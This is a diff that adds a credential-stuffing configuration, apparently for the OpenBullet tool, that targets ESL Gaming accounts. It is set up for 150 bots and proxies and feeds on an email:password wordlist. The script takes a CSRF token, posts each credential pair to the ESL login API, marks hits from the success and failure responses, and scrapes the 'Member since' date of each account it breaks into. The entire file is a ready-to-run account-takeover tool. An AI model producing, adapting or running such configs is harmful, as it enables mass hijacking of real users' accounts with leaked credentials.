@@ -1,0 +1,72 @@
+[SETTINGS]
+{
+  "Name": "ESLGaming",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-17T06:28:52.0602368+02:00",
+  "AdditionalInfo": "",
+  "Author": "xKeksbyte",
+  "Version": "1.2.8 Modded",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GetCSRF_Token_API REQUEST POST "https://account.eslgaming.com/api/user/csrf-token" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "origin: https://account.eslgaming.com" 
+  HEADER "referer: https://account.eslgaming.com/login" 
+  HEADER "Accept: */*" 
+
+PARSE "<HEADERS(X-Csrf-Token)>" LR "" "" -> VAR "Token" 
+
+REQUEST GET "https://play.eslgaming.com/america" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Login_site REQUEST POST "https://account.eslgaming.com/api/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "x-csrf-token: <Token>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.80 Safari/537.36" 
+  HEADER "origin: https://account.eslgaming.com" 
+  HEADER "referer: https://account.eslgaming.com/login" 
+  HEADER "Accept: */*" 
+
+#HeaderUserID PARSE "<HEADERS(http_user_id)>" LR "" "" -> VAR "userid" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "login:wrong-password" 
+    KEY "{\"errors\":[\"login:wrong-password\"]}" 
+  KEYCHAIN Success OR 
+    KEY "{}" 
+
+REQUEST GET "https://play.eslgaming.com/player/<userid>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Member PARSE "<SOURCE>" LR "<td class=\"firstcol\">Member since</td>" "</td>" -> VAR "Member since" 
+
